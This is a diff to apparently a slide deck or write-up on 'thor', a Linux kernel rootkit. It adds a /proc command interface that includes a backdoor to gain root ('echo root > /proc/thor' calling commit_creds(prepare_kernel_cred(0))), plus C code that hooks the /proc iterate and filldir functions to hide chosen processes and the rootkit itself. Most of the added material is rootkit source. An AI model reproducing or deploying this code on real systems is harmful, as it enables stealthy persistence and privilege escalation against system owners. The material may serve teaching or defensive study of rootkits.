@@ -13,14 +13,43 @@ date: 2015-01-30
 ## Features
 
 - works with recent kernel
-- hide files by name
+    - x86_64
+    - ARM (BeagleBone Black)
+- hide files by suffix (`__thor`)
 - hide kernel modules
 - hide processes
 - hide sockets
 - automatically handles forked processes
 - hijack kernel functions
+    - may not always work
+    - *may lead to race conditions, kernel panics and other problems*
 
 # Communication
+
+## Usage
+
+    usage:
+       echo hp PID    > /proc/thor     (hides process PID)
+       echo up PID    > /proc/thor     (unhides process PID)
+       echo upa       > /proc/thor     (unhide all PIDs)
+       echo hm MODULE > /proc/thor     (hide module)
+       echo um MODULE > /proc/thor     (unhide module)
+       echo uma       > /proc/thor     (unhide all modules)
+       echo root      > /proc/thor     (gain root privileges)
+
+# Gain Root Privileges
+
+## `commit_creds()`
+
+```{.c .numberLines}
+    /* ... */
+
+    } else if (strncmp(buffer, "root", MIN(4, count)) == 0) {
+
+        commit_creds(prepare_kernel_cred(0));
+
+    }
+```
 
 # Handling Forks
 
@@ -77,9 +106,105 @@ Will be shown in the next part.
 
 # Hiding Process
 
+## Init
+
+```{.c .numberLines}
+int pidhider_init(void)
+{
+    /* ... */
+
+    /* insert our modified iterate for /proc */
+    procroot = procfile->parent;
+    proc_fops = (struct file_operations*) procroot->proc_fops;
+
+    /* store original iterate function */
+    orig_proc_iterate = proc_fops->iterate;
+
+    iterate_addr = (void*) &(thor_proc_iterate);
+    write_no_prot(&proc_fops->iterate, &iterate_addr, sizeof(void*));
+
+    /* ... */
+
+    return 0;
+}
+```
+
+## Cleanup
+
+```{.c .numberLines}
+void pidhider_cleanup(void)
+{
+    if (proc_fops != NULL && orig_proc_iterate != NULL) {
+        void *iterate_addr = orig_proc_iterate;
+
+        write_no_prot(&proc_fops->iterate, &iterate_addr, sizeof(void*));
+    }
+
+    /* ... */
+}
+```
+
+## `thor_proc_iterate()`
+
+```{.c .numberLines}
+static int thor_proc_iterate(struct file *file, struct dir_context *ctx)
+{
+    int ret;
+    filldir_t *ctx_actor;
+
+    /* capture original filldir function */
+    orig_proc_filldir = ctx->actor;
+
+    /* cast away const from ctx->actor */
+    ctx_actor = (filldir_t*) (&ctx->actor);
+
+    /* store our filldir in ctx->actor */
+    *ctx_actor = thor_proc_filldir;
+    ret = orig_proc_iterate(file, ctx);
+
+    /* restore original filldir */
+    *ctx_actor = orig_proc_filldir;
+
+    return ret;
+}
+```
+
+## `thor_proc_filldir()`
+
+```{.c .numberLines}
+static int thor_proc_filldir(void *buf, const char *name, int namelen,
+                             loff_t offset, u64 ino, unsigned d_type)
+{
+
+    /* ... */
+
+    /* hide specified PIDs */
+    list_for_each_entry(tmp, &(pid_list.list), list) {
+        if (pid == tmp->pid) {
+            return 0;
+        }
+    }
+
+    /* hide thor itself */
+    if (strcmp(name, THOR_PROCFILE) == 0) {
+        return 0;
+    }
+
+    return orig_proc_filldir(buf, name, namelen, offset, ino, d_type);
+}
+```
+
 # Hiding Kernel Modules
 
+## -
+
+similar to the previous one
+
 # Hiding Files
+
+## -
+
+similar to the previous one
 
 # Hiding Sockets
 
